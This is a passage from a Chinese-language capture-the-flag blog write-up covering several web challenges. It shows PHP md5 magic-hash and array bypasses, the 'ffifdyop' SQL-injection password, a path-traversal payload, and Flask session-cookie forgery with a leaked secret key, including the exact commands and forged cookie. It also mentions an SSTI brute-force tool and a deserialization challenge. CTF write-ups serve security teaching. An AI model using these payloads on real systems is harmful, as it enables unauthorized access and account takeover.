class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>post 一個 a不可以是數字 , 但是一個數字</li><li>post 兩個 b1 b2 md5值一樣</li><li>post 兩個 c1 c2兩字符串不相等, md5值一樣</li></ol><p>a可以用數組繞過 a[]&#x3D;1</p><p>b1 b2 都可以用數組繞過 方法二：使用数组绕过（更简单）</p><br/><p>如果PHP版本允许，可以尝试：</p><p>b1[]&#x3D;1&amp;b2[]&#x3D;2  &#x2F;&#x2F; NULL &#x3D;&#x3D;&#x3D; NULL</p><p>c1 , c2: md5相同值文件選一個 (0e繞過) &#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="55bf9b54aede8a60262900db6606f8d2.png" alt="55bf9b54aede8a60262900db6606f8d2.png" /><h2 id="18-奇妙的MD5"><a href="#18-奇妙的MD5" class="headerlink" title="18.奇妙的MD5"></a>18.奇妙的MD5</h2><h3 id="兩神奇的字符串"><a href="#兩神奇的字符串" class="headerlink" title="兩神奇的字符串"></a>兩神奇的字符串</h3><p><strong>0e215962017</strong> md5加密後 : <strong>0e291242476940776845150308577824</strong></p><p><strong>ffifdyop</strong> md5加密後:** 276f722736c95d99e921722cf9ed621c** , from hex 後是** ‘or’6É]é!r,ùíb**</p><p>ffifdyop是萬能密碼</p><p>抓個包看看</p><img src="b37282e967f6ce91bd65b7ffe174a690.png" alt="b37282e967f6ce91bd65b7ffe174a690.png" /><br/><p>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>要填寫萬能密碼: ffifdyop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$x= $GET[&#x27;x&#x27;];</span><br><span class="line">$y = $_GET[&#x27;y&#x27;];</span><br><span class="line">if($x != $y &amp;&amp; md5($x) == md5($y))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>(0e繞過)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="2700d2660e4a04d9c498fa1773717036.png" alt="2700d2660e4a04d9c498fa1773717036.png" /><p>数组绕过</p><img src="128ea3f616632eba411990eb56b74c70.png" alt="128ea3f616632eba411990eb56b74c70.png" /><h2 id="19-高亮主题-划掉-背景查看器"><a href="#19-高亮主题-划掉-背景查看器" class="headerlink" title="19.高亮主题(划掉)背景查看器"></a>19.高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件包含漏洞演示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并包含用户输入的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No file specified.&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dirsearch一下</p><img src="51ce037052d7772b9b20fbe8a7cd6b26.png" alt="51ce037052d7772b9b20fbe8a7cd6b26.png" /><p>[02:08:34] 200 -    11B - &#x2F;flag , 試一試有了一個提示</p><img src="8a6dc14880c549d4f517c4932b726e3e.png" alt="8a6dc14880c549d4f517c4932b726e3e.png" /><p>flag在根目錄下 </p><p> 在url下不能&#x2F;..&#x2F;..&#x2F;..&#x2F;.. , 代碼有說明  ,  那BP抓一下包</p><img src="02dfb9ca469befd3b4bcca77bfe9ece6.png" alt="02dfb9ca469befd3b4bcca77bfe9ece6.png" /><p>在切換主題時發現有POST 傳參 theme &#x3D; </p><p>試一試&#x2F;flag</p><img src="47b31af9751041bbc61d65e8df30f718.png" alt="47b31af9751041bbc61d65e8df30f718.png" /><p>不在這目錄下, ..一下</p><img src="4be84a4293e0bed53f122823feda714f.png" alt="4be84a4293e0bed53f122823feda714f.png" /><p>再..&#x2F;..&#x2F;……………….</p><img src="cee00419105f25959368de46b1b75db6.png" alt="cee00419105f25959368de46b1b75db6.png" /><p>theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag 成功拿到flag</p><h2 id="20-flask-jwt"><a href="#20-flask-jwt" class="headerlink" title="20.flask?jwt?"></a>20.flask?jwt?</h2><img src="f373c598d4c19eb78f3a03e17c9f1723.png" alt="f373c598d4c19eb78f3a03e17c9f1723.png" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>忘记密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/password.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/jquery-1.11.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> height=$(<span class="variable language_">document</span>).<span class="title function_">height</span>();</span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.main&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;height&#x27;</span>,height);</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 919px;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main0&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formBox&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>登录密码重置<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;mainCol firLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>身份验证<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;gt;</span>登录密码重置<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;lastLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>重置完成<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/line.png&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;itembox&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱号<span class="symbol">&amp;nbsp;</span>:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入注册邮箱号&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btnBox&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>发送重置密码邮件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer0&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_l&quot;</span>&gt;</span>使用条款 | 隐私保护<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_r&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>© C4skg<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>有问题请发送邮件至 adm1n@flag.com <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- secretkey: th3f1askisfunny --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="session偽造"><a href="#session偽造" class="headerlink" title="session偽造"></a>session偽造</h3><p>th3f1askisfunny , 這個可能是session偽造 </p><p>注冊一下 , 12345 12345 </p><img src="b01798a1df1520a7381ab32a4cfe6b57.png" alt="b01798a1df1520a7381ab32a4cfe6b57.png" /><img src="86e46a2828e01e9a7aafc13852a79603.png" alt="86e46a2828e01e9a7aafc13852a79603.png" /><p>session &#x3D; .eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM</p><p>下載: <a href="https://">https://github.com/noraj/flask-session-cookie-manager</a></p><p>我要用Ubuntu 才可以conda (web_env) </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;.eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM&quot; -s &quot;th3f1askisfunny&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure><p>合理猜測id &#x3D; 1 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> python3 flask_session_cookie_manager3.py encode -s &quot;th3f1</span><br><span class="line">askisfunny&quot; -t &quot; &#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd</span><br><span class="line">4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">.eJwlzjEOwzAIAMC_MHeAYJuQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjhs6camKZJCqMzNJMfsg5ExV5E2xw3o1ajVJPXMmpkhlBJF02p10YrGjC5oC-OK6BQR1IyWJC20QhlRNVHVTbWR94Q7cp15_DcE3x_Ovy_z.aOiklg.8mo1XmLqTIj-6RuRxvgu7__4Y-g</span><br></pre></td></tr></table></figure><img src="5e432dcdae883b55ace167cf0a4183b7.png" alt="5e432dcdae883b55ace167cf0a4183b7.png" /><img src="e7ebc9cb9ac2e7adfe317a16803a861d.png" alt="e7ebc9cb9ac2e7adfe317a16803a861d.png" /><img src="ab72b2d9bf4d126f3f38646240947868.png" alt="ab72b2d9bf4d126f3f38646240947868.png" /><h2 id="21-ez-SSTI"><a href="#21-ez-SSTI" class="headerlink" title="21.ez_SSTI"></a>21.ez_SSTI</h2><p>在kali安裝fenjing :</p><p>pip install fenjing -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><img src="96f12fb4d30448b04b349f1049b740c3.png" alt="96f12fb4d30448b04b349f1049b740c3.png" /><p>輸入參數開始爆破</p><h2 id="22-easy-unser"><a href="#22-easy-unser" class="headerlink" title="22.easy_unser"></a>22.easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">人类最大的敌人,就是无序. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p> 是将 PHP 对象转换为字符串的过程，可以使用 serialize() 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。</p><p><a 